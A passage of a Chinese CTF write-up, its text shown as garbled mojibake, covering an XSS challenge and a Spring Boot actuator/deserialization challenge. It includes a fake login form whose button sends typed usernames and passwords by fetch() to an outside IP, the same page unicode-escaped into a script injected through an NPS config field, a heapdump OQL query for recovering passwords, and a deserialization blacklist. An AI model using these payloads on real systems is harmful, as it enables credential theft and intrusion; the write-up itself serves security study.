<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"fetch('http://43.143.192.19:1145/',{method:'POST',body:$('#username')[0].value+'___'+$('#password')[0].value});"</span> langtang=&gt;&lt;/button&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>$(â€˜#usernameâ€™) æ˜¯ä¸€ä¸ª jQuery é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹©å…·æœ‰æŒ‡å®š id å±æ€§çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸­ï¼Œ#username è¡¨ç¤ºè¦é€‰æ‹© id ä¸º â€œusernameâ€ çš„å…ƒç´ ã€‚ä¼šä»è¾“å…¥è·å–</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"text"</span> <span class="built_in">id</span>=<span class="string">"username"</span> name=<span class="string">"username"</span> value=<span class="string">"flag"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>å†æ ¹æ®è¿™ä¸ª</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.fill(<span class="string">'input[name="username"]'</span>, <span class="string">'admin'</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">'input[name="password"]'</span>, PASSWORD);</span><br></pre></td></tr></tbody></table></figure>
<p>è®©æœºå™¨äººå»è¾“å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç™»å½•æ¡†ï¼Œä»è€Œé€šè¿‡ input è·å–åˆ° flag.</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">"username"</span> <span class="built_in">id</span>=<span class="string">"username"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Username"</span> required=<span class="string">""</span> langtag=<span class="string">"word-username"</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">"password"</span> <span class="built_in">id</span>=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Password"</span> required=<span class="string">""</span> langtag=<span class="string">"word-password"</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>å¦‚æ­¤ï¼Œåœˆå¥—å·²è®¾ï¼Œåªç­‰æ•Œå†›è¿›å…¥</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form <span class="keyword">class</span>=<span class="string">"m-t"</span> onsubmit=<span class="string">"return false"</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">"username"</span> <span class="built_in">id</span>=<span class="string">"username"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Username"</span> required=<span class="string">""</span> langtag=<span class="string">"word-username"</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">"password"</span> <span class="built_in">id</span>=<span class="string">"password"</span> <span class="built_in">type</span>=<span class="string">"password"</span> <span class="keyword">class</span>=<span class="string">"form-control"</span> placeholder=<span class="string">"Password"</span> required=<span class="string">""</span> langtag=<span class="string">"word-password"</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button onclick=<span class="string">"fetch('http://43.143.192.19:1145/',{method:'POST',body:$('#username')[0].value+'___'+$('#password')[0].value});"</span> langtag=<span class="string">"word-login"</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™ä¹ˆå¤æ‚æ•°æ®ä¼ è¾“èµ·æ¥ä¸æ–¹ä¾¿ï¼ŒğŸ‘´ä¸å–œæ¬¢ï¼Œæ¢ä¸€ä¸ª</p>
<h3 id="exp"><a class="markdownIt-Anchor" href="#exp-2">#</a> exp</h3>
<p>unicode å°±è¡Œï¼Œè€Œä¸”æ§åˆ¶å°å¤§å¤§æ”¯æŒ unicode</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=node4.buuoj.cn:<span class="number">26658</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\u003c\u0068\u0074\u006d\u006c\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0068\u0065\u0061\u0064\u003e\u003c\u002f\u0068\u0065\u0061\u0064\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0062\u006f\u0064\u0079\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0066\u006f\u0072\u006d\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u006d\u002d\u0074\u0022\u0020\u006f\u006e\u0073\u0075\u0062\u006d\u0069\u0074\u003d\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0066\u0061\u006c\u0073\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0069\u0064\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0069\u0064\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0074\u0079\u0070\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0062\u0075\u0074\u0074\u006f\u006e\u0020\u006f\u006e\u0063\u006c\u0069\u0063\u006b\u003d\u0022\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0032\u002e\u0031\u0039\u003a\u0031\u0031\u0034\u0035\u002f\u0027\u002c\u007b\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0027\u0050\u004f\u0053\u0054\u0027\u002c\u0062\u006f\u0064\u0079\u003a\u0024\u0028\u0027\u0023\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u002b\u0027\u005f\u005f\u005f\u0027\u002b\u0024\u0028\u0027\u0023\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u007d\u0029\u003b\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u006c\u006f\u0067\u0069\u006e\u0022\u003e\u004c\u006f\u0067\u0069\u006e\u003c\u002f\u0062\u0075\u0074\u0074\u006f\u006e\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0066\u006f\u0072\u006d\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u002f\u0062\u006f\u0064\u0079\u003e\u000a\u003c\u002f\u0068\u0074\u006d\u006c\u003e`&lt;/sCrIpT&gt;</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -config ./conf/npc.conf</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101233054.png" alt="å¾®ä¿¡æˆªå›¾_20231101233054"></p>
<p>ç»ˆäºæ‹¿åˆ°äº†è‰¹ï¼Œ30s ç‚¹ä¸€æ¬¡ï¼ŒğŸ‘´tm ä»¥ä¸º x ä¸è¿›å»äº†</p>
<p>ã¾ã ã¾ã ã­ã€å¼±ã„ï¼</p>
<h1 id="deserializeupload"><a class="markdownIt-Anchor" href="#deserializeupload">#</a> Deserialize?Upload!</h1>
<h2 id="actuator"><a class="markdownIt-Anchor" href="#actuator">#</a> actuatorğŸ˜«</h2>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102082010.png" alt="å¾®ä¿¡æˆªå›¾_20231102082010"></p>
<p>é¦–å…ˆï¼Œé¢˜ç›®æœ‰ä¸ªğŸš¢â™¥çš„ä¾èµ–ï¼Œæ˜¾ç„¶ğŸ‘´ä¸çŸ¥é“è¿™æ˜¯å¹²å•¥çš„ï¼Œæ€ä¹ˆåŠï¼Œå­¦ï¼</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring bootâ€”â€”Actuator è¯¦è§£ - æ›¹ä¼Ÿé›„ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é…ç½®æ–¹é¢</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>æœ‰äº†è¿™ä¸ªä¾èµ–ï¼Œé‚£ä¹ˆ Spring å°±ä¼šè‡ªåŠ¨å¼€æ”¾ <code>/actuator/health</code>  å’Œ <code>/actuator/info</code>  è¿™ä¸¤ä¸ªè·¯å¾„</p>
<p>è®¿é—® <code>[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/)</code> , å¯ä»¥å¾—åˆ° /acturator çš„è·¯ç”±</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"_links"</span>: {</span><br><span class="line">        <span class="string">"self"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"health"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/health"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"health-path"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/health/{*path}"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">true</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"info"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/info"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"env"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/env"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"env-toMatch"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/env/{toMatch}"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">true</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"heapdump"</span>: {</span><br><span class="line">            <span class="string">"href"</span>: <span class="string">"http://127.0.0.1:9090/actuator/heapdump"</span>,</span><br><span class="line">            <span class="string">"templated"</span>: <span class="literal">false</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›ç»å¸¸ä½¿ç”¨çš„è·¯å¾„</p>
<table>
<thead>
<tr>
<th style="text-align:center">HTTP æ–¹æ³•</th>
<th style="text-align:center">Endpoint</th>
<th style="text-align:center">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator</td>
<td style="text-align:center">æŸ¥çœ‹æœ‰å“ªäº›è·¯å¾„</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/env</td>
<td style="text-align:center">æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå±æ€§ï¼Œçœ‹ Spring çš„çš„ properties, ä½†æ˜¯ä¼šè‡ªåŠ¨è„±æ•æ‰ä¸€äº› secret key ç­‰æ•æ„Ÿä¿¡æ¯</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/health</td>
<td style="text-align:center">æŸ¥çœ‹è¿è¡ŒæŒ‡æ ‡</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/info</td>
<td style="text-align:center">æŸ¥çœ‹ properties ä¸­ info å¼€å¤´çš„å±æ€§ï¼Œæ²’å•¥ç”¨</td>
</tr>
<tr>
<td style="text-align:center">GET</td>
<td style="text-align:center">/actuator/heapdump</td>
<td style="text-align:center">è·å– JVM çš„ heap dump</td>
</tr>
</tbody>
</table>
<p>ğŸ¤£é»˜è®¤ Actuator  <code>/actuator/health</code>  å’Œ <code>/actuator/info</code>  ä¸¤ä¸ª endpointï¼Œå¦‚æœè¦å¼€æ”¾å…¶ä»– endpoint çš„è©±ï¼Œéœ€åœ¨åœ¨ application.properties ä¸­åšè®¾ç½®ã€‚<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102085646.png" alt="å¾®ä¿¡æˆªå›¾_20231102085646"></p>
<p>Heap dumpï¼ˆå †è½¬å‚¨ï¼‰æ˜¯æŒ‡å°†ä¸€ä¸ª Java è¿›ç¨‹çš„å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å’Œæ•°æ®ç»“æ„ä»¥äºŒè¿›åˆ¶æ ¼å¼å†™å…¥æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œå†…å­˜åˆ†æå’Œæ’æŸ¥å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚Heap dump åŒ…å«äº† Java å †å†…å­˜ä¸­çš„å¯¹è±¡å®ä¾‹ã€å¯¹è±¡å¼•ç”¨å…³ç³»ã€ç±»ä¿¡æ¯ç­‰ï¼Œå®ƒæ˜¯è¯Šæ–­å’Œè°ƒè¯• Java åº”ç”¨ç¨‹åºçš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚</p>
<p>ğŸ‘´è¯´ç‚¹äººè¯ï¼šåæ­£ Heap dump äº‹å†…å­˜ç›¸å…³çš„ä¸œè¥¿ï¼Œè‚¯å®šæœ‰æ•æ„Ÿä¿¡æ¯ï¼ŒğŸ‘´å°±æ˜¯è¦æŠŠå®ƒä¸‹ä¸‹æ¥è¿›è¡Œä¸€é€šä¹±è¶…ï¼Œä¸çŸ¥é“ä½ ä»¬æ€ä¹ˆå¿å¾—ä½çš„ï¼Œäº‹ğŸ‘´ç›´æ¥æ‹¿èµ·æ¥ç‹ ç‹ åœ°åˆ†æ.</p>
<p>æ€ä¹ˆåˆ†æï¼Œå½“æ—¶äº‹ç”¨ jdk è‡ªå¸¦çš„ jhat</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat -J-Xmx512M <span class="string">"/path/to/heapdump"</span></span><br></pre></td></tr></tbody></table></figure>
<p>ç„¶åå°±ä¼šæœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé‡Œé¢å°±åŠ è½½å†…å­˜çš„å†…å®¹</p>
<p>md, ä¾æ‰˜âœç‰¹ï¼Œ</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/"</span>})).permitAll().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"/admin/**"</span>})).authenticated().and()).formLogin().loginProcessingUrl(<span class="string">"/login"</span>)).permitAll()).and()).csrf().disable();</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>ğŸ§€spring å®‰å…¨é…ç½®ï¼Œ <code>http.authorizeRequests().antMatchers(new String[]{"/"}).permitAll()</code>  è¡¨ç¤ºå¯¹ / è·¯ç”±è®¿é—®å…è®¸ä»»æ„ç”¨æˆ·ï¼Œ</p>
<p><code>antMatchers(new String[]{"/admin/**"}).authenticated()</code>  è¡¨ç¤º <code>/admin/</code>  å¼€å¤´éªŒè¯ç”¨æˆ·</p>
<p><code>.formLogin().loginProcessingUrl("/login").permitAll()</code> /login çš„è¡¨è¾¾ç™»å½•ä¸éœ€è¦éªŒè¯</p>
<p>è¿™é‡Œå°±æ˜¯è®©ğŸ‘´æ‹¿åˆ° password</p>
<h2 id="é¢˜ç›®å®è·µ"><a class="markdownIt-Anchor" href="#é¢˜ç›®å®è·µ">#</a> é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡</h2>
<p>wcsndm,sb ä¸œè¥¿ï¼Œé¢˜ç›®ç¯å¢ƒæ²¡äº†ï¼Œè¡Œå§ï¼ŒğŸ‘´æœ¬åœ°æ­ä¸€ä¸ªï¼Œnmd å¥—æ¨¡æ¿æ•´äº†ä¸ª docker-compose, å‘Šè¯‰ğŸ‘´nmd <code>project name must not be empty</code> , ä½  tmd å€’æ˜¯å‘Šè¯‰ğŸ‘´å“ªé‡Œæ²¡æœ‰ project name, é˜¿ç±³è¯ºæ–¯ï¼Œä¸€æ ¼å¾·æ‹‰ç±³.</p>
<p>åªèƒ½æ‰‹åŠ¨ docker build.</p>
<p>åŒæ ·æ‹¿åˆ° heapdump</p>
<p>ç›´æ¥æ‰“å¼€</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvisualvm</span><br></pre></td></tr></tbody></table></figure>
<p>åˆ«é—®ğŸ‘´å“ªé‡Œè£…ï¼Œè¿™ nmjava è‡ªå¸¦çš„</p>
<p>è¿›è¡Œä¸€æ³¢ OQL æŸ¥è¯¢</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key)</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œç”¨çš„äº‹æ­£åˆ™æµ‹è¯• /rgexp/.test () çš„å½¢å¼ï¼Œè™½ç„¶é‡Œé¢å†…å®¹æ²¡ç”¨åˆ°å•¥æ­£åˆ™ï¼Œåªæ˜¯èµ°ä¸ªå½¢å¼è€Œå·²ï¼Œåˆ«é—®ğŸ‘´ä¸ºå•¥ä¸ç›´æ¥æŸ¥ value,nmd value æ˜¯ä¸ªå¯¹è±¡è¿˜æœªçŸ¥ï¼Œä½ æŸ¥ä¸ªâˆšâ‘§.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102101315.png" alt="å¾®ä¿¡æˆªå›¾_20231102101315"></p>
<p>tmd /login ç™»è¿›å»ï¼Œè®©ğŸ‘´çœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102102004.png" alt="å¾®ä¿¡æˆªå›¾_20231102102004"></p>
<p>æºèµ–æ°ä¸€ä¸ªåå°ç®¡ç†ç³»ç»Ÿï¼Œèƒ½ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹.</p>
<h2 id="ååºåˆ—åŒ–åˆ†æ"><a class="markdownIt-Anchor" href="#ååºåˆ—åŒ–åˆ†æ">#</a> ååºåˆ—åŒ–åˆ†æğŸ˜›</h2>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping({"/deserialize"})</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam("b64str")</span> String b64str)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">byte</span>[] serialized = Base64.getDecoder().decode(b64str);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">SafeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>å¾ˆç¾å¥½å¯¹å§ï¼Œjackson é“¾ç›´æ¥æ‰“ï¼Œä½†æ˜¯ğŸ‘´å‘ç°äº†ä¸å¯¹åŠ²ï¼Œmd æœ‰æ¯’</p>
<p>è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„ <code>SafeObjectInputStream</code>  å§</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass input) <span class="keyword">throws</span> IOException, ClassNotFoundException {</span><br><span class="line">        <span class="keyword">if</span> (BLACKLIST.contains(input.getName())) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">"Hacker!!"</span>);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(input);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        BLACKLIST.add(<span class="string">"com.fasterxml.jackson.databind.node.POJONode"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">"java.security.SignedObject"</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>éƒ½ç»™ä½  ban äº†ï¼Œrnm, å‡ºé¢˜äººçœŸçš„é˜´é™©ï¼Œç°åœ¨ä¸æŠŠ jackson é“¾ ban äº†ï¼Œéƒ½ä¸æ•¢ååºåˆ—åŒ–äº†æ˜¯å§ğŸ˜…</p>
<p>æ€ä¹ˆç»˜ä¸–å‘¢</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ -ååºåˆ—åŒ–ç»„åˆæ‹³"><a class="markdownIt-Anchor" href="#æ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–ç»„åˆæ‹³">#</a> æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤</h2>
<p>é¢˜ç›®ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œé‚£æ€»ä¸èƒ½ä¸ç”¨å§ï¼Œè¦ä¸ç„¶é¢˜ç›®æ•´è¿™ Î²Ã· ç©æ„å¹²å˜›å‘€.ğŸ˜…</p>
